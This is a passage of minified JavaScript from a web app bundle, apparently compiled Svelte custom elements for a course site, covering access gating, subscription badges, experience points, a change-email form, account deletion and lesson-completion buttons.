      e && e.target && p(e.target, this, e.anchor);
  }
}
function kh(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "denied");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Ih(n) {
  let e;
  return {
    c() {
      (e = b("slot")), w(e, "name", "granted");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Eh(n) {
  let e;
  function t(o, s) {
    return o[0] || o[1] ? Ih : kh;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee()), (this.c = k);
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, [s]) {
      r !== (r = t(o)) &&
        (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    i: k,
    o: k,
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function Th(n, e, t) {
  let r;
  ie(n, Zt, (o) => t(1, (r = o)));
  let { free: i = !1 } = e;
  return (
    (n.$$set = (o) => {
      "free" in o && t(0, (i = o.free));
    }),
    [i, r]
  );
}
customElements.define("if-user", vh);
class Sh extends K {
  constructor(e) {
    super(),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Th,
        Eh,
        G,
        { free: 0 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["free"];
  }
  get free() {
    return this.$$.ctx[0];
  }
  set free(e) {
    this.$$set({ free: e }), W();
  }
}
function io(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "PRO"),
        w(e, "class", "label green"),
        w(e, "title", "all access pass");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function oo(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "Lifer"),
        w(e, "class", "label green"),
        w(e, "title", "you are a total chad");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function so(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "SUDO"),
        w(e, "class", "label blue"),
        w(e, "title", "enterprise account");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function ao(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "Vet"),
        w(e, "class", "label orange"),
        w(e, "title", "thank you for being a former member");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function lo(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "Basic"),
        w(e, "class", "label gray"),
        w(e, "title", "upgrade for all access");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Ch(n) {
  var R, L, _, P, te, ne, D, z;
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l,
    c,
    u,
    d =
      (null !=
      (_ =
        null == (L = null == (R = n[1]) ? void 0 : R.xp)
          ? void 0
          : L.toLocaleString("en", { notation: "compact" }))
        ? _
        : 0) + "",
    f = "active" === (null == (P = n[0]) ? void 0 : P.pro_status) && io(),
    m = "lifetime" === (null == (te = n[0]) ? void 0 : te.pro_status) && oo(),
    y = "enterprise" === (null == (ne = n[0]) ? void 0 : ne.pro_status) && so(),
    I = "canceled" === (null == (D = n[0]) ? void 0 : D.pro_status) && ao(),
    v = !(null != (z = n[0]) && z.pro_status) && lo();
  return {
    c() {
      (e = b("div")),
        (t = b("user-data")),
        (r = E()),
        f && f.c(),
        (i = E()),
        m && m.c(),
        (o = E()),
        y && y.c(),
        (s = E()),
        I && I.c(),
        (a = E()),
        v && v.c(),
        (l = E()),
        (c = b("span")),
        (u = A(d)),
        (this.c = k),
        Te(t, "field", "photoURL"),
        w(e, "class", "wrap"),
        w(c, "class", "xp"),
        w(c, "title", "experience points");
    },
    m(B, q) {
      p(B, e, q),
        h(e, t),
        h(e, r),
        f && f.m(e, null),
        h(e, i),
        m && m.m(e, null),
        h(e, o),
        y && y.m(e, null),
        h(e, s),
        I && I.m(e, null),
        h(e, a),
        v && v.m(e, null),
        p(B, l, q),
        p(B, c, q),
        h(c, u);
    },
    p(B, [q]) {
      var H, M, X, re, ue, be, Be, ke;
      "active" === (null == (H = B[0]) ? void 0 : H.pro_status)
        ? f || ((f = io()), f.c(), f.m(e, i))
        : f && (f.d(1), (f = null)),
        "lifetime" === (null == (M = B[0]) ? void 0 : M.pro_status)
          ? m || ((m = oo()), m.c(), m.m(e, o))
          : m && (m.d(1), (m = null)),
        "enterprise" === (null == (X = B[0]) ? void 0 : X.pro_status)
          ? y || ((y = so()), y.c(), y.m(e, s))
          : y && (y.d(1), (y = null)),
        "canceled" === (null == (re = B[0]) ? void 0 : re.pro_status)
          ? I || ((I = ao()), I.c(), I.m(e, a))
          : I && (I.d(1), (I = null)),
        null != (ue = B[0]) && ue.pro_status
          ? v && (v.d(1), (v = null))
          : v || ((v = lo()), v.c(), v.m(e, null)),
        2 & q &&
          d !==
            (d =
              (null !=
              (ke =
                null == (Be = null == (be = B[1]) ? void 0 : be.xp)
                  ? void 0
                  : Be.toLocaleString("en", { notation: "compact" }))
                ? ke
                : 0) + "") &&
          U(u, d);
    },
    i: k,
    o: k,
    d(B) {
      B && g(e),
        f && f.d(),
        m && m.d(),
        y && y.d(),
        I && I.d(),
        v && v.d(),
        B && g(l),
        B && g(c);
    },
  };
}
function Ah(n, e, t) {
  let r, i;
  return (
    ie(n, gt, (o) => t(0, (r = o))), ie(n, Lt, (o) => t(1, (i = o))), [r, i]
  );
}
customElements.define("if-access", Sh);
class Rh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.wrap{position:relative;top:0.25rem;width:3rem;overflow:clip\n}.label{position:absolute;bottom:0px;left:50%;margin-left:auto;margin-right:auto;display:block;--tw-translate-x:-50%;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));cursor:help;border-radius:0.125rem;padding-left:0.5rem;padding-right:0.5rem;text-align:center;font-family:cubano, sans-serif;font-size:0.75rem;line-height:1rem;--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}.label.green{--tw-bg-opacity:1;background-color:rgb(34 197 94 / var(--tw-bg-opacity))\n}.label.gray{--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity))\n}.label.blue{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity))\n}.label.orange{--tw-bg-opacity:1;background-color:rgb(249 115 22 / var(--tw-bg-opacity))\n}.xp{position:absolute;top:0px;right:-2rem;min-width:5ch;cursor:help;border-radius:9999px;background-color:rgb(0 0 0 / var(--tw-bg-opacity));--tw-bg-opacity:0.5;padding:0.25rem;text-align:center;font-size:0.875rem;line-height:1.25rem;font-weight:700;--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity));--tw-shadow:0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 20px 25px -5px var(--tw-shadow-color), 0 8px 10px -6px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Ah,
        Ch,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
var Is;
customElements.define("user-avatar", Rh);
const Qt = Se(
  JSON.parse(
    null == (Is = null == localStorage ? void 0 : localStorage.autoplay) || Is
  )
);
Qt.subscribe((n) => {
  localStorage && (localStorage.autoplay = n);
});
const Br = Se(!1);
let Wa;
window.addEventListener("flamethrower:router:fetch", (n) => {
  Wa = setTimeout(() => {
    Br.set(!0);
  }, 0);
}),
  window.addEventListener("flamethrower:router:end", (n) => {
    clearTimeout(Wa),
      setTimeout(() => {
        Br.set(!1);
      }, 400);
  });
const Vt = Se("month"),
  Ga = Rs([Rn], ([n]) => {
    const e = jr(null == n ? void 0 : n.permalink);
    return e && Ot[e];
  });
function Ph(n) {
  let e, t, r;
  return {
    c() {
      (e = b("span")), (e.textContent = "change email"), w(e, "class", "info");
    },
    m(i, o) {
      p(i, e, o), t || ((r = O(e, "click", n[12])), (t = !0));
    },
    p: k,
    d(i) {
      i && g(e), (t = !1), r();
    },
  };
}
function xh(n) {
  let e, t, r, i, o, s, a, l;
  function c(f, m) {
    return f[2] ? Lh : Oh;
  }
  let d = c(n),
    u = d(n);
  return {
    c() {
      (e = b("input")),
        (t = E()),
        u.c(),
        (r = E()),
        (i = b("p")),
        (o = A(
          "Be careful. If you enter the wrong email, you will not be able to access\n    your account.\n    "
        )),
        (s = b("span")),
        (s.textContent = "nevermind"),
        w(e, "type", "email"),
        w(e, "placeholder", "new email"),
        (e.required = !0),
        w(s, "class", "info"),
        w(i, "class", "warn");
    },
    m(f, m) {
      p(f, e, m),
        de(e, n[4]),
        n[9](e),
        p(f, t, m),
        u.m(f, m),
        p(f, r, m),
        p(f, i, m),
        h(i, o),
        h(i, s),
        a ||
          ((l = [
            O(e, "input", n[8]),
            O(e, "input", n[6]),
            O(s, "click", n[11]),
          ]),
          (a = !0));
    },
    p(f, m) {
      16 & m && e.value !== f[4] && de(e, f[4]),
        d === (d = c(f)) && u
          ? u.p(f, m)
          : (u.d(1), (u = d(f)), u && (u.c(), u.m(r.parentNode, r)));
    },
    d(f) {
      f && g(e),
        n[9](null),
        f && g(t),
        u.d(f),
        f && g(r),
        f && g(i),
        (a = !1),
        fe(l);
    },
  };
}
function Oh(n) {
  let e, t, r, i, o;
  return {
    c() {
      (e = b("button")),
        (t = A("change")),
        w(e, "class", "btn btn-blue"),
        (e.disabled = r = n[0] || !n[3] || !n[4]);
    },
    m(s, a) {
      p(s, e, a), h(e, t), i || ((o = O(e, "click", n[10])), (i = !0));
    },
    p(s, a) {
      25 & a && r !== (r = s[0] || !s[3] || !s[4]) && (e.disabled = r);
    },
    d(s) {
      s && g(e), (i = !1), o();
    },
  };
}
function Lh(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    r = n[0] ? "loading..." : "confirm change",
    l = n[0] && co();
  return {
    c() {
      (e = b("button")),
        l && l.c(),
        (t = E()),
        (i = A(r)),
        w(e, "class", "btn btn-blue"),
        (e.disabled = o = n[0] || !n[3] || !n[4]);
    },
    m(c, d) {
      p(c, e, d),
        l && l.m(e, null),
        h(e, t),
        h(e, i),
        s || ((a = O(e, "click", n[7])), (s = !0));
    },
    p(c, d) {
      c[0] ? l || ((l = co()), l.c(), l.m(e, t)) : l && (l.d(1), (l = null)),
        1 & d && r !== (r = c[0] ? "loading..." : "confirm change") && U(i, r),
        25 & d && o !== (o = c[0] || !c[3] || !c[4]) && (e.disabled = o);
    },
    d(c) {
      c && g(e), l && l.d(), (s = !1), a();
    },
  };
}
function co(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Nh(n) {
  let e;
  function t(o, s) {
    return o[1] ? xh : Ph;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee()), (this.c = k);
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, [s]) {
      r === (r = t(o)) && i
        ? i.p(o, s)
        : (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    i: k,
    o: k,
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function Mh(n, e, t) {
  let l,
    r = !1,
    i = !1,
    o = !1,
    s = !1,
    a = "";
  return [
    r,
    i,
    o,
    s,
    a,
    l,
    function c() {
      t(3, (s = l.validity.valid));
    },
    async function d() {
      t(0, (r = !0)),
        (await ge({ fn: "changeEmail", payload: { email: a } })) &&
          (await Fr(),
          me.set({
            message: "Email updated, please sign back in",
            type: "success",
          })),
        t(0, (r = !1));
    },
    function u() {
      (a = this.value), t(4, a);
    },
    function f(v) {
      st[v ? "unshift" : "push"](() => {
        (l = v), t(5, l);
      });
    },
    () => t(2, (o = !0)),
    () => t(1, (i = !1)),
    () => t(1, (i = !0)),
  ];
}
class Dh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{margin-top:0.125rem;margin-bottom:0.125rem;display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none;--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);outline:2px solid transparent;outline-offset:2px\n}button:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}button:disabled{cursor:not-allowed;opacity:0.7\n}.info{cursor:pointer;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}input{margin-top:1rem;margin-bottom:1rem;margin-right:0.75rem;width:100%;border-style:solid;--tw-border-opacity:1;border-color:rgb(42 46 53 / var(--tw-border-opacity));--tw-bg-opacity:1;background-color:rgb(18 24 27 / var(--tw-bg-opacity));padding:0.75rem;font-family:sofia-pro, sans-serif;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px\n}.warn{font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Mh,
        Nh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Uh(n) {
  let e, t, r;
  return {
    c() {
      (e = b("span")),
        (e.textContent = "Delete this Account"),
        w(e, "class", "info");
    },
    m(i, o) {
      p(i, e, o), t || ((r = O(e, "click", n[7])), (t = !0));
    },
    p: k,
    d(i) {
      i && g(e), (t = !1), r();
    },
  };
}
function Fh(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    l,
    r = (n[1] ? "terminating..." : n[3]) + "",
    c = n[1] && uo(),
    d = n[0] && fo(n);
  return {
    c() {
      (e = b("button")),
        c && c.c(),
        (t = E()),
        (i = A(r)),
        (o = E()),
        d && d.c(),
        (s = ee()),
        w(e, "class", "btn btn-red"),
        (e.disabled = n[1]);
    },
    m(u, f) {
      p(u, e, f),
        c && c.m(e, null),
        h(e, t),
        h(e, i),
        p(u, o, f),
        d && d.m(u, f),
        p(u, s, f),
        a || ((l = O(e, "click", n[6])), (a = !0));
    },
    p(u, f) {
      u[1] ? c || ((c = uo()), c.c(), c.m(e, t)) : c && (c.d(1), (c = null)),
        10 & f && r !== (r = (u[1] ? "terminating..." : u[3]) + "") && U(i, r),
        2 & f && (e.disabled = u[1]),
        u[0]
          ? d
            ? d.p(u, f)
            : ((d = fo(u)), d.c(), d.m(s.parentNode, s))
          : d && (d.d(1), (d = null));
    },
    d(u) {
      u && g(e), c && c.d(), u && g(o), d && d.d(u), u && g(s), (a = !1), l();
    },
  };
}
function uo(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function fo(n) {
  let e, t, r, i, o;
  return {
    c() {
      (e = b("p")),
        (t = A(
          "Final warning! Once you click this button there's no going back. All account data is lost forever. \n            "
        )),
        (r = b("span")),
        (r.textContent = "nevermind"),
        w(r, "class", "info"),
        w(e, "class", "warn");
    },
    m(s, a) {
      p(s, e, a), h(e, t), h(e, r), i || ((o = O(r, "click", n[5])), (i = !0));
    },
    p: k,
    d(s) {
      s && g(e), (i = !1), o();
    },
  };
}
function Hh(n) {
  let e;
  function t(o, s) {
    return o[2] ? Fh : Uh;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee()), (this.c = k);
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, [s]) {
      r === (r = t(o)) && i
        ? i.p(o, s)
        : (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    i: k,
    o: k,
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function jh(n, e, t) {
  let r,
    i = !1,
    o = !1,
    s = !1;
  async function a() {
    t(1, (i = !0)),
      (await ge({ fn: "deleteAccount", payload: {} })) &&
        (await Fr(),
        me.set({
          message: "Account terminated, good luck in your future endeavors",
          type: "success",
        })),
      t(1, (i = !1));
  }
  return (
    (n.$$.update = () => {
      1 & n.$$.dirty &&
        t(3, (r = s ? "confirm destruction" : "delete account"));
    }),
    [
      s,
      i,
      o,
      r,
      a,
      function l() {
        t(2, (o = !1)), t(0, (s = !1));
      },
      () => (s ? a() : t(0, (s = !0))),
      () => t(2, (o = !0)),
    ]
  );
}
customElements.define("change-email", Dh);
class zh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.btn{margin-top:0.125rem;margin-bottom:0.125rem;display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(239 68 68 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none;--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);outline:2px solid transparent;outline-offset:2px\n}.btn:hover{--tw-bg-opacity:1;background-color:rgb(185 28 28 / var(--tw-bg-opacity))\n}.btn:disabled{cursor:not-allowed;opacity:0.7\n}.info{cursor:pointer;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}.warn{font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        jh,
        Hh,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Bh(n) {
  let e, t, r;
  return {
    c() {
      (e = b("modal-action")),
        (e.innerHTML =
          '<svg xmlns="http://www.w3.org/2000/svg" class="svg-sm" viewBox="0 0 448 512"><path fill="currentColor" d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z"></path></svg>'),
        (t = E()),
        (r = b("span")),
        (r.textContent = "locked"),
        Te(e, "name", "signin"),
        Te(e, "type", "open"),
        Te(e, "class", "purple"),
        w(r, "class", "msg purple");
    },
    m(i, o) {
      p(i, e, o), p(i, t, o), p(i, r, o);
    },
    p: k,
    d(i) {
      i && g(e), i && g(t), i && g(r);
    },
  };
}
function Vh(n) {
  let e;
  function t(o, s) {
    var a;
    return null != (a = o[4]) && a[o[0]] ? qh : $h;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee());
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, s) {
      r === (r = t(o)) && i
        ? i.p(o, s)
        : (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function $h(n) {
  let e,
    t,
    r,
    o,
    s,
    a,
    i = n[1] ? "pop quiz" : "incomplete";
  return {
    c() {
      (e = b("button")),
        (e.innerHTML =
          '<svg viewBox="0 0 512 512"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM256 48C141.1 48 48 141.1 48 256C48 370.9 141.1 464 256 464C370.9 464 464 370.9 464 256C464 141.1 370.9 48 256 48z"></path></svg>'),
        (t = E()),
        (r = b("span")),
        (o = A(i)),
        w(e, "class", "incomplete"),
        w(r, "class", "msg"),
        Z(r, "pink", n[1]);
    },
    m(l, c) {
      p(l, e, c),
        p(l, t, c),
        p(l, r, c),
        h(r, o),
        s || ((a = O(e, "click", n[7])), (s = !0));
    },
    p(l, c) {
      2 & c && i !== (i = l[1] ? "pop quiz" : "incomplete") && U(o, i),
        2 & c && Z(r, "pink", l[1]);
    },
    d(l) {
      l && g(e), l && g(t), l && g(r), (s = !1), a();
    },
  };
}
function qh(n) {
  let e, t, r, i, o;
  return {
    c() {
      (e = b("button")),
        (e.innerHTML =
          '<svg viewBox="0 0 512 512"><path d="M0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256zM371.8 211.8C382.7 200.9 382.7 183.1 371.8 172.2C360.9 161.3 343.1 161.3 332.2 172.2L224 280.4L179.8 236.2C168.9 225.3 151.1 225.3 140.2 236.2C129.3 247.1 129.3 264.9 140.2 275.8L204.2 339.8C215.1 350.7 232.9 350.7 243.8 339.8L371.8 211.8z"></path></svg>'),
        (t = E()),
        (r = b("span")),
        (r.textContent = "done"),
        w(e, "class", "complete"),
        w(r, "class", "msg complete");
    },
    m(s, a) {
      p(s, e, a),
        p(s, t, a),
        p(s, r, a),
        i || ((o = O(e, "click", n[6])), (i = !0));
    },
    p: k,
    d(s) {
      s && g(e), s && g(t), s && g(r), (i = !1), o();
    },
  };
}
function Wh(n) {
  let e;
  function t(o, s) {
    return o[2] || o[3] ? Vh : Bh;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      (e = b("span")), i.c(), (this.c = k), w(e, "class", "wrap");
    },
    m(o, s) {
      p(o, e, s), i.m(e, null);
    },
    p(o, [s]) {
      r === (r = t(o)) && i
        ? i.p(o, s)
        : (i.d(1), (i = r(o)), i && (i.c(), i.m(e, null)));
    },
    i: k,
    o: k,
    d(o) {
      o && g(e), i.d();
    },
  };
}
function Gh(n, e, t) {
  let r, i;
  ie(n, Zt, (u) => t(3, (r = u))), ie(n, Lt, (u) => t(4, (i = u)));
  let { route: o = window.location.pathname } = e,
    { quiz: s = !1 } = e,
    { free: a = !1 } = e;
  async function l(u) {
    if (u) {
      if (s) return void Ae.set("quiz");
      await qa(o);
    } else await Gp(o);
  }
  return (
    (n.$$set = (u) => {
      "route" in u && t(0, (o = u.route)),
        "quiz" in u && t(1, (s = u.quiz)),
        "free" in u && t(2, (a = u.free));
    }),
    [o, s, a, r, i, l, () => l(!1), () => l(!0)]
  );
}
customElements.define("delete-account", zh);
class Kh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{background:none;cursor:pointer;border-radius:9999px;border-style:none;outline:2px solid transparent;outline-offset:2px;transition-property:transform;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}button:hover{--tw-translate-y:-0.125rem;transform:translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}svg{width:2rem}modal-action{cursor:pointer}.svg-sm{width:1.25rem}.msg{position:relative;font-size:0.75rem;line-height:1rem;--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity))}.pink{--tw-text-opacity:1;color:rgb(236 72 153 / var(--tw-text-opacity))}.purple{--tw-text-opacity:1;color:rgb(168 85 247 / var(--tw-text-opacity))}.incomplete{fill:#b2becd}.incomplete:hover{fill:#22c55e}.complete{fill:#22c55e;--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity))}.wrap{display:flex;min-width:48px;flex-direction:column;align-items:center;justify-content:center}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Gh,
        Wh,
        G,
        { route: 0, quiz: 1, free: 2 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["route", "quiz", "free"];
  }
  get route() {
    return this.$$.ctx[0];
  }
  set route(e) {
    this.$$set({ route: e }), W();
  }
  get quiz() {
    return this.$$.ctx[1];
  }
  set quiz(e) {
    this.$$set({ quiz: e }), W();
  }
  get free() {
    return this.$$.ctx[2];
  }
  set free(e) {
    this.$$set({ free: e }), W();
  }
}
function po(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.innerHTML =
          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" width="16" height="16" class="purple"><path d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z"></path></svg>'),
        w(e, "class", "wrap");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function ho(n) {
  let e;
  function t(o, s) {
    var a;
    return null != (a = o[3]) && a[o[0]] ? Jh : Yh;
  }
  let r = t(n),
    i = r(n);
  return {
    c() {
      i.c(), (e = ee());
    },
    m(o, s) {
      i.m(o, s), p(o, e, s);
    },
    p(o, s) {
      r !== (r = t(o)) &&
        (i.d(1), (i = r(o)), i && (i.c(), i.m(e.parentNode, e)));
    },
    d(o) {
      i.d(o), o && g(e);
    },
  };
}
function Yh(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.innerHTML =
          '<svg viewBox="0 0 512 512" width="18" height="18" class="gray"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM256 48C141.1 48 48 141.1 48 256C48 370.9 141.1 464 256 464C370.9 464 464 370.9 464 256C464 141.1 370.9 48 256 48z"></path></svg>'),
        w(e, "class", "wrap");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Jh(n) {
  let e;
  return {
    c() {
      (e = b("span")),
        (e.innerHTML =
          '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="green" width="18" height="18"><path d="M0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256zM371.8 211.8C382.7 200.9 382.7 183.1 371.8 172.2C360.9 161.3 343.1 161.3 332.2 172.2L224 280.4L179.8 236.2C168.9 225.3 151.1 225.3 140.2 236.2C129.3 247.1 129.3 264.9 140.2 275.8L204.2 339.8C215.1 350.7 232.9 350.7 243.8 339.8L371.8 211.8z"></path></svg>'),
        w(e, "class", "wrap");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Xh(n) {
  let e,
    t,
    r = !n[1] && !n[2] && po(),
    i = (n[1] || n[2]) && ho(n);
  return {
    c() {
      r && r.c(), (e = E()), i && i.c(), (t = ee()), (this.c = k);
    },
    m(o, s) {
      r && r.m(o, s), p(o, e, s), i && i.m(o, s), p(o, t, s);
    },
    p(o, [s]) {
      o[1] || o[2]
        ? r && (r.d(1), (r = null))
        : r || ((r = po()), r.c(), r.m(e.parentNode, e)),
        o[1] || o[2]
          ? i
            ? i.p(o, s)
            : ((i = ho(o)), i.c(), i.m(t.parentNode, t))
          : i && (i.d(1), (i = null));
    },
    i: k,
    o: k,
    d(o) {
      r && r.d(o), o && g(e), i && i.d(o), o && g(t);
    },
  };
}
function Zh(n, e, t) {
  let r, i;
  ie(n, Zt, (a) => t(2, (r = a))), ie(n, Lt, (a) => t(3, (i = a)));
  let { route: o } = e,
    { free: s } = e;
  return (
    (n.$$set = (a) => {
      "route" in a && t(0, (o = a.route)), "free" in a && t(1, (s = a.free));
    }),
    [o, s, r, i]
  );
}
customElements.define("mark-complete", Kh);
class Qh extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
